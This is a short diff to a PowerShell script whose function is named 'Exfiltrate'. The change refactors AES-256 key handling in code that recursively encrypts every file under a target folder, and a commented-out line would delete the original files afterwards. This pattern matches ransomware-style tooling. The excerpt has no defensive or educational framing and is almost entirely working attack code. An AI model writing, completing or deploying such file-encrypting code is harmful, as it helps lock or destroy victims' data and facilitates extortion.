@@ -189,18 +189,7 @@ function Exfiltrate
     $aes.KeySize = 256
     $aes.BlockSize = 128
 
-    # ----- KEY HANDLING -----
-    if ($AesKey -is [string]) {
-        $keyBytes = [Convert]::FromBase64String($AesKey)
-    }
-    elseif ($AesKey -is [byte[]]) {
-        $keyBytes = $AesKey
-    }
-    else {
-        throw "AesKey must be Base64 string or byte array."
-    }
-
-    $aes.Key = $keyBytes
+    $aes.Key = $AesKey
     $aes.GenerateIV()
 
     $encryptor = $aes.CreateEncryptor()
@@ -232,14 +221,13 @@ function Exfiltrate
     
     # Remove BOM, whitespace, CR, LF, ZWNBSP, tabs
     $keyBase64 = $keyBase64.Trim() -replace "^[\uFEFF\u200B]+",""
-
-    $keyBytes = [Convert]::FromBase64String($keyBase64)
+    $aesKey = [Convert]::FromBase64String($keyBase64)
 
     # Encrypt each file
     $files = Get-ChildItem -Path $FolderPath -File -Recurse
 
     foreach ($file in $files) {
-        Encrypt-File -FilePath $file.FullName -AesKey $keyBytes
+        Encrypt-File -FilePath $file.FullName -AesKey $aesKey
         #Remove-Item $file.FullName
     }
 
